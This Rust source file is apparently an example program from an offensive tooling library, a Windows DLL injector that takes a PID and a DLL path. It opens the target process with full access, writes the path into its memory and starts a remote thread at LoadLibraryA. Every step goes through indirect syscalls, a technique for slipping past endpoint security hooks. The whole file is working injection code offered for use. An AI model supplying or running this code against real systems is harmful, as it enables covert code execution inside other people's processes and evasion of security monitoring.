#![allow(unused)]


use std::{mem, process};
use std::ffi::c_void;
use std::ops::Not;
use std::path::{Path, PathBuf};
use std::ptr::null;

use thermite::{debug, error, info};
use thermite::indirect_syscall as syscall;
use thermite::models::windows::*;
use thermite::models::windows::nt_status::NtStatus;
use thermite::models::windows::peb_teb::UnicodeString;
use thermite::peb_walk::{get_function_address, get_module_address};


/// Read the PID and the DLL Path from the program's command line arguments,
/// if a valid PID and a valid DLL Path is read, it calls the injector function
/// If nothing is found or if the argument cannot be parsed, prints an error and closes the program
fn main() {
	// Collect the command line arguments,
	// then we quit the program printing the Usage help if we don't have enough
	let args: Vec<String> = std::env::args().collect::<Vec<String>>();
	if args.len() < 3 {
		error!("Usage: dll_injector.exe <PID> <Path to DLL>");
		process::exit(NtStatus::StatusAssertionFailure as _);
	}
	// Parses the PID, again quitting if it fails
	let pid: u32 = args[1].parse::<u32>().ok().unwrap_or_else(|| {
		error!("Failed to parse target PID");
		process::exit(NtStatus::StatusBadData as _);
	});

	// Then we parse the DLL path, and quit if we cannot parse it at all.
	let binding = args[2].parse::<PathBuf>().ok().unwrap_or_else(|| {
		error!("Failed to parse DLL Path");
		process::exit(NtStatus::StatusBadData as _);
	});
	let dll = binding.as_path();

	// We also perform additional checks to make sure the path is correct
	if dll.is_file().not()
		|| dll.is_absolute().not() {
		error!("Please provide an absolute path to your DLL.");
		process::exit(NtStatus::StatusAssertionFailure as _);
	}

	// Run the actual injector
	injector(pid, dll.to_str().unwrap());
}


/// This function demonstrate how to inject a DLL in a remote process using direct syscalls
/// Arguments: PID of the target process and the absolute path to the DLL to inject
fn injector(pid: u32, dll_path: &str) {
	let oa_process = ObjectAttributes::default();
	let mut thread_handle: isize = 0;
	let mut process_handle: isize = -1;

	let client_id = ClientId {
		unique_process: pid as _,
		unique_thread: 0 as _,
	};

	syscall!("NtOpenProcess",
	    &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
	    PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
	    &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
	    &client_id);         //  [in, optional] PCLIENT_ID         client_id
	
	let mut buf_size: usize = dll_path.len();
	let mut base_addr: *mut c_void = 0u32 as _;

	let nt_status = syscall!("NtAllocateVirtualMemory",
	    process_handle,           // [in]      HANDLE   ProcessHandle,
	    &mut base_addr,           // [in, out] PVOID    *BaseAddress,
	    0u32,                     // [in]      PULONG   ZeroBits,
	    &mut buf_size,            // [in, out] PSIZE_T  RegionSize,
	    MEM_COMMIT | MEM_RESERVE, // [in]      ULONG    AllocationType,
	    PAGE_READWRITE);          // [in]      ULONG    Protect
	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);

	// Copy the DLL Path to newly allocated memory
	let mut bytes_written: usize = 0;
	syscall!("NtWriteVirtualMemory",
	    process_handle,      // [in]            HANDLE ProcessHandle,
	    base_addr,           // [in]            PVOID  *BaseAddress,
	    dll_path.as_ptr(),   // [in]            PVOID  buffer,
	    buf_size,            // [in]            ULONG  NumberOfBytesToWrite,
	    &mut bytes_written); // [out, optional] PULONG NumberOfBytesWritten ,
	info!("Successfully written {} bytes in remote memory", buf_size);

	// Change protection status of allocated memory to READ+EXECUTE
	// let mut bytes_written = POP_CALC.len();
	let mut old_protection = PAGE_READWRITE;
	syscall!("NtProtectVirtualMemory",
	    process_handle,      // [in]      HANDLE ProcessHandle,
	    &mut base_addr,      // [in, out] PVOID  *BaseAddress,
	    &mut bytes_written,  // [in, out] PULONG NumberOfBytesToProtect,
	    PAGE_EXECUTE_READ,   // [in]      ULONG  NewAccessProtection,
	    &mut old_protection);// [out]     PULONG OldAccessProtection,


	let load_library_ptr = unsafe {
		let kernel32_ptr = get_module_address("kernel32.dll").unwrap();
		get_function_address("LoadLibraryA", kernel32_ptr).unwrap()
	};

	// Create a remote thread in target process
	syscall!("NtCreateThreadEx",
	    &mut thread_handle,    // [out]          PHANDLE ThreadHandle,
	    GENERIC_EXECUTE,       // [in]           ACCESS_MASK DesiredAccess,
	    null::<*mut c_void>(), // [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
	    process_handle,        // [in]           HANDLE ProcessHandle,
	    load_library_ptr,      // [in, optional] PVOID StartRoutine,
	    base_addr,             // [in, optional] PVOID Argument,
	    0,                     // [in]           ULONG CreateFlags,
	    null::<*mut c_void>(), // [in, optional] ULONG_PTR ZeroBits,
	    null::<*mut c_void>(), // [in, optional] SIZE_T StackSize,
	    null::<*mut c_void>(), // [in, optional] SIZE_T MaximumStackSize,
	    null::<*mut c_void>());// [in, optional] PVOID AttributeList

	// Wait for the thread to execute
	// Timeout is a null pointer, so we wait indefinitely
	syscall!("NtWaitForSingleObject",
	    thread_handle,          //  [in] HANDLE         handle,
	    0,                      //  [in] BOOLEAN        Alertable,
	    null::<*mut u64>());    //  [in] PLARGE_INTEGER Timeout

	// Close the handle
	syscall!("NtClose",
	    thread_handle); // [in] HANDLE handle

}
